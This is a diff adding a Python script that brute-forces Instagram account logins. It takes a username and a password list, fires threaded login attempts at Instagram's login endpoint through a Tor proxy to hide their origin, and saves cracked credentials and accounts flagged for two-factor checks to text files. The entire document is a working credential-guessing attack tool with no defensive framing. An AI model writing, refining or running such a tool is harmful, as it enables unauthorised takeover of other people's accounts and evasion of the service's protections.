@@ -1,0 +1,88 @@
+import socket
+import requests
+import sys
+import threading
+import time
+import os
+import random
+from random import randint
+from six.moves import input
+from datetime import datetime
+import re
+
+class IBruter(object):
+    def __init__(self, proxy):
+        try:
+            user = input('username: ')
+            Combo = input('password List: ')
+            print('\n**************************')
+
+        except:
+            print('exit')
+            sys.exit()
+
+        with open(Combo, 'r') as x:
+            Combolist = x.read().splitlines()
+        thread = []
+        self.Coutprox = 0
+        for combo in Combolist:
+            password = combo.split(':')[0]
+            t = threading.Thread(target=self.New_Br, args=(user, password, proxy))
+            t.start()
+            thread.append(t)
+            time.sleep(0.9)
+        for j in thread:
+            j.join()
+
+    def cls(self):
+        linux = 'clear'
+        windows = 'cls'
+        os.system([linux, windows][os.name == 'nt'])
+
+    def New_Br(self, user, pwd, proxy):
+        url = 'https://www.instagram.com/accounts/login/'
+        login_url = 'https://www.instagram.com/accounts/login/ajax/'
+
+        timestamp = int(datetime.now().timestamp())
+
+        payload = {
+            'username': user,
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{pwd}',
+            'queryParams': {},
+            'optIntoOneTap': 'false'
+        }
+
+        proxies = {
+            "http": proxy,
+            "https": proxy
+        }
+
+        with requests.Session() as s:
+            r = s.get(url, proxies=proxies)
+            r = s.post(login_url, data=payload, headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
+                "X-Requested-With": "XMLHttpRequest",
+                "Referer": "https://www.instagram.com/accounts/login/",
+                "x-csrftoken": 'MEoux7diueb86sirEHhxRmZYZmFhqMoS'
+            }, proxies=proxies)
+            
+            print(f'{user}:{pwd}\n----------------------------')
+
+            if 'checkpoint_url' in r.text:
+                print(f'{user}:{pwd} --> BOOOMMMMMM Its The pAssWorD ')
+                with open('good.txt', 'a') as x:
+                    x.write(f'{user}:{pwd}\n')
+            elif 'two_factor_required' in r.text:
+                print(f'{user}:{pwd} --> OHHH GUYS it 2FA enabled ')
+                with open('results_NeedVerfiy.txt', 'a') as x:
+                    x.write(f'{user}:{pwd}\n')
+
+def main():
+    # Configura el proxy SOCKS de Tor
+    proxy = "socks5h://localhost:9050"  # Asegúrate de tener Tor corriendo en el puerto 9050
+
+    # Llama a la clase IBruter pasándole el proxy
+    IBruter(proxy)
+
+if __name__ == "__main__":
+    main()
